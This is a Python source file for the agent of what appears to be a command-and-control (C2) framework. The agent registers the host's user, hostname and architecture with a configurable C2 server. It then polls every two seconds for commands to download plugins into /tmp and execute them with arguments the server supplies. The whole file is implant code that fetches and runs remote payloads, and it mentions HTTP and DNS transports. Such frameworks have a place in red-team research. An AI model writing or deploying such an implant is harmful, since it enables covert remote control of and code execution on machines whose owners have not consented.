import socket
from threading import Thread 
import subprocess
import os
import requests
import time
import subprocess

import sys

import comm.transport_Http as transportMode

import importlib
import plugin
import executor



agent_id = None

serverAddr = "http://127.0.0.1:5000"

pluginHolder = {}


def registerAgent(serverAddr):
    currentUser = subprocess.run("whoami",capture_output=True).stdout.decode().strip()
    jsonData = {
        "user":currentUser,
        "host":os.uname().nodename,
        "arch":os.uname().machine
        }

    serverAddr =  serverAddr + "/register"
    r = transportMode.sendRequest(serverAddr,jsonData,method="post")
    global agent_id
    agent_id = r.json()['id']
    print(f"Id: {agent_id}")


def pollAndCommandCheck(serverAddr):
    serverAddress = serverAddr + "/command/" + agent_id
    r = transportMode.sendRequest(serverAddress,{},method="get")

    if len(r.json()):
        cmd = r.json()['cmd']

        print(f"command was: {cmd}")

        if cmd == "download":

         pl = plugin.Plugin(r.json()['params']['plugin'],agent_id,serverAddr,"/tmp")
         pluginHolder.__setitem__(pl.pluginId,pl)
         pl.downloadPlugin()

        elif cmd == "run":
         execution_id = r.json()['execution_id']
         pluginid = r.json()['params']['plugin']
         args = r.json()['params']['args'] # TODO: @rohit to do something with the arg
         exec_handler = executor.pluginExecution(pluginHolder[pluginid],execution_id, args)
         Thread(target=exec_handler.execute()).start()
   


def startAgentSocket():
    PORT = 6789
    agent_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    agent_s.bind(("localhost", PORT))
    #agent_s.listen()
    while True:
        data, addr = agent_s.recvfrom(102400)
        print("received message: %s" % data)



#Register the agent, one time activity at the spinup
#then start the agent

def startAgent():
 while True:
    Thread(target=pollAndCommandCheck,args=[serverAddr]).start()
    time.sleep(2)
    pass

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--c2url", help="C2 URL,default http://127.0.0.1:5000 ")
    parser.add_argument("--module", help="Transport module to load(transport_Http,transport_dns), default transport_Http")
    args = parser.parse_args()
    if args.c2url:
        serverAddr = args.c2url
    if args.module:
        transportMode = args.module
   # transportMode = importlib.import_module(transportMode)
 
    # Set environment variables for later to be passed into plugins
    os.environ['DEF_C2_ADDR'] = serverAddr
    os.environ['DEF_AGENT_BIN'] = sys.executable

    registerAgent(serverAddr)
    startAgent()


   

    









